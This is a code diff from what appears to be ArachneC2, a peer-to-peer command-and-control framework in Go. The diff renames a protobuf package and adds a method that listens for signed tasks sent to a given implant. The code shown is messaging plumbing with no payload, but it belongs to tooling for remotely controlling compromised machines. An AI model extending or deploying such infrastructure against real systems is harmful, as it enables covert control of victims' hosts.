@@ -11,13 +11,13 @@ import (
 	"github.com/libp2p/go-libp2p/core/crypto"
 	"github.com/libp2p/go-libp2p/core/peer"
 
-	arachnepb "github.com/portbuster1337/ArachneC2/protobuf/arachnepb"
+	apb "github.com/portbuster1337/ArachneC2/protobuf/apb"
 	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
 )
 
 var ErrSignatureInvalid = fmt.Errorf("signature invalid")
 
-type MessageHandler func(ctx context.Context, envelope *arachnepb.Envelope, senderPub crypto.PubKey)
+type MessageHandler func(ctx context.Context, envelope *apb.Envelope, senderPub crypto.PubKey)
 
 type Messenger struct {
 	node          *Node
@@ -88,7 +88,7 @@ func (m *Messenger) TaskTopic(implantPeerID string) string {
 	return BeaconTopicPrefix + m.operatorID.String() + TasksSuffix + implantPeerID
 }
 
-func VerifyEnvelope(env *arachnepb.Envelope, trustedPub crypto.PubKey) error {
+func VerifyEnvelope(env *apb.Envelope, trustedPub crypto.PubKey) error {
 	if trustedPub == nil {
 		return fmt.Errorf("no trusted public key configured")
 	}
@@ -105,7 +105,7 @@ func VerifyEnvelope(env *arachnepb.Envelope, trustedPub crypto.PubKey) error {
 	return nil
 }
 
-func PubKeyFromEnvelope(env *arachnepb.Envelope) (crypto.PubKey, error) {
+func PubKeyFromEnvelope(env *apb.Envelope) (crypto.PubKey, error) {
 	if len(env.SenderKey) == 0 {
 		return nil, fmt.Errorf("no sender key in envelope")
 	}
@@ -123,7 +123,7 @@ func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted
 			if err != nil {
 				return
 			}
-			env := &arachnepb.Envelope{}
+			env := &apb.Envelope{}
 			if err := proto.Unmarshal(msg.Data, env); err != nil {
 				continue
 			}
@@ -157,7 +157,15 @@ func (m *Messenger) ListenCommands(ctx context.Context) error {
 	})
 }
 
-func (m *Messenger) deliver(ctx context.Context, env *arachnepb.Envelope) {
+func (m *Messenger) ListenTask(ctx context.Context, implantPeerID string) error {
+	return m.listenVerified(ctx, m.TaskTopic(implantPeerID), func() crypto.PubKey {
+		m.mu.RLock()
+		defer m.mu.RUnlock()
+		return m.trustedPubKey
+	})
+}
+
+func (m *Messenger) deliver(ctx context.Context, env *apb.Envelope) {
 	m.mu.RLock()
 	handler := m.handler
 	m.mu.RUnlock()
@@ -171,7 +179,7 @@ func (m *Messenger) deliver(ctx context.Context, env *arachnepb.Envelope) {
 	handler(ctx, env, pubKey)
 }
 
-func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *arachnepb.Envelope) error {
+func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *apb.Envelope) error {
 	data, err := proto.Marshal(env)
 	if err != nil {
 		return fmt.Errorf("marshal envelope: %w", err)
@@ -179,7 +187,7 @@ func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *arachne
 	return m.node.Publish(ctx, topic, data)
 }
 
-func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *arachnepb.Envelope) error {
+func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *apb.Envelope) error {
 	if m.privKey == nil {
 		return fmt.Errorf("no private key for signing")
 	}
@@ -196,8 +204,8 @@ func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *arachnep
 	return m.SendEnvelope(ctx, topic, env)
 }
 
-func (m *Messenger) CreateEnvelope(msgType uint32, data []byte) *arachnepb.Envelope {
-	return &arachnepb.Envelope{
+func (m *Messenger) CreateEnvelope(msgType uint32, data []byte) *apb.Envelope {
+	return &apb.Envelope{
 		ID:   time.Now().UnixNano(),
 		Type: msgType,
 		Data: data,
